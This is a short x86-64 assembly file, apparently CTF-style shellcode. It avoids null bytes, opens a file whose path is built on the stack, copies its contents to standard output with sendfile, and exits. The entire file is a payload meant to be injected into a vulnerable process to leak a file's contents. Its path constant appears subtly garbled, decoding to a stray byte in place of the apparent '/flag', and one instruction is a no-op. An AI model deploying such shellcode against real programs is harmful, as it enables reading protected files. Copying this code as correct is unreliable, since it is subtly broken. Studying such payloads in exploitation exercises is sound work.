.global _start
_start:
.intel_syntax noprefix
	xor rbx, rbx								# xor trick to zero the register
	mov rbx, 0x67616cc62fdeadbf # The last 3 bytes are filler to prevent using a null bytes being written.
	shr rbx, 24									# Additionally, the filler bytes get chopped off here.
	push rbx
	mov rax, rax
	mov al, 2										# We don't need the whole 64 bits to write 0x2
	mov rdi, rsp
	xor rsi, rsi								# xor trick to zero the register
	syscall											# syscall

	xor rdi, rdi								# xor trick to zero the register
	inc rdi											# set rdi to 1 like before
	mov rsi, rax
	xor rdx, rdx								# xor trick to zero the register
	mov r10, 0x3e8deadbeefdead	# '0xdeadbeefdead' will get chopped off
	shr r10, 48									# chopping off filler
	mov al, 40									# don't use whole 64 bits
	syscall											# syscall

	mov al, 60									# don't use whole 64 bits
	syscall											# syscall
